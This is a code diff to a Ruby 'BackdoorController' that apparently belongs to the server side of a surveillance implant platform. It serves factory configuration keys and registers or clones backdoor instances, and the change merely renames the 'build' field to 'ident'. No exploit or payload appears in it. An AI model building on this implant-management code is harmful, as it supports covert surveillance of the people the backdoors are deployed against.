@@ -16,18 +16,18 @@ class BackdoorController < RESTController
   # otherwise, return all the keys for all the classes
   def factory_keys
     require_auth_level :server
-
+    
     classes = {}
-
+    
     # request for a specific instance
     if @params['_id'] then
-      Item.where({_kind: 'factory', build: @params['_id']}).each do |entry|
-          classes[entry[:build]] = entry[:confkey]
+      Item.where({_kind: 'factory', ident: @params['_id']}).each do |entry|
+          classes[entry[:ident]] = entry[:confkey]
       end
     # all of them
     else
       Item.where({_kind: 'factory'}).each do |entry|
-          classes[entry[:build]] = entry[:confkey]
+          classes[entry[:ident]] = entry[:confkey]
         end
     end
     
@@ -53,7 +53,7 @@ class BackdoorController < RESTController
     end
     
     # is the backdoor already in the database? (has it synchronized at least one time?)
-    backdoor = Item.where({_kind: 'backdoor', build: @params['build'], instance: @params['instance'], platform: platform, demo: demo}).first
+    backdoor = Item.where({_kind: 'backdoor', ident: @params['ident'], instance: @params['instance'], platform: platform, demo: demo}).first
 
     # yes it is, return the status
     unless backdoor.nil?
@@ -71,7 +71,7 @@ class BackdoorController < RESTController
     end
 
     # search for the factory of that instance
-    factory = Item.where({_kind: 'factory', build: @params['build'], status: 'open'}).first
+    factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first
 
     # the status of the factory must be open otherwise no instance can be cloned from it
     return RESTController.reply.not_found if factory.nil?
@@ -80,7 +80,7 @@ class BackdoorController < RESTController
     factory[:counter] += 1
     factory.save
 
-    trace :info, "Creating new instance for #{factory[:build]} (#{factory[:counter]})"
+    trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"
 
     # clone the new instance from the factory
     backdoor = factory.clone_instance
